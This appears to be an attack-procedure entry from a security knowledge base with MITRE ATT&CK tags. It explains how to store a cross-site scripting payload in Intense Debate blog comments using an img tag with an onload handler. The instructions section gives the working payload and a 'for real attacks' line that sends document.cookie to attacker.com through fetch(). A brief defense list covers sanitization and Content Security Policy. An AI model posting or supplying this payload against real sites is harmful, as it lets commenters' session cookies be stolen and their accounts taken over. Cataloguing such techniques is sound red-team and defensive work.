---
id: proc-002
tags:
  - xss
  - injection
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:44.510Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Submit-Malicious-XSS-Comment-in-Intense-Debate

## Summary

This procedure injects a stored XSS payload into a blog comment using an img tag with an onload attribute, exploiting poor sanitization to store malicious JavaScript for later execution.

## Description

Once image support is enabled, attackers can post comments containing unsanitized HTML like <img> tags. The payload uses a legitimate image source from Intense Debate itself to avoid suspicion, with onload executing JavaScript (e.g., alert() for testing, or cookie theft in production). The comment is stored server-side and rendered for all viewers, making it a persistent stored XSS. Prerequisites include a user account and enabled images.

## Requirements

1. Enabled image support in the comment system
2. Valid user account to post comments
3. Target blog URL with Intense Debate integration

## Defense

Defensive measures and detection strategies:

- Sanitize all HTML inputs, stripping or escaping attributes like onload
- Use Content Security Policy (CSP) to block inline JavaScript
- Review and moderate comments before approval

## Objectives

1. Store malicious JavaScript in the comment database
2. Ensure the payload renders without alteration
3. Set up for execution on comment views

## Instructions

### Step 1: Prepare Payload

**Context**: Craft the XSS payload to evade basic filters.

Use: `<img src="https://intensedebate.com/images/a-addblog.png" onload="alert('XSS')">`

> This loads a real image and executes on load. For real attacks, replace alert with `fetch('https://attacker.com/steal?cookie='+document.cookie)`.

### Step 2: Post Comment

**Context**: Submit the payload as a comment on the target blog.

Navigate to the blog post's comment form and paste the payload into the comment field, then submit.

> Verify the comment appears in the list without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[injection]]
- [[web]]
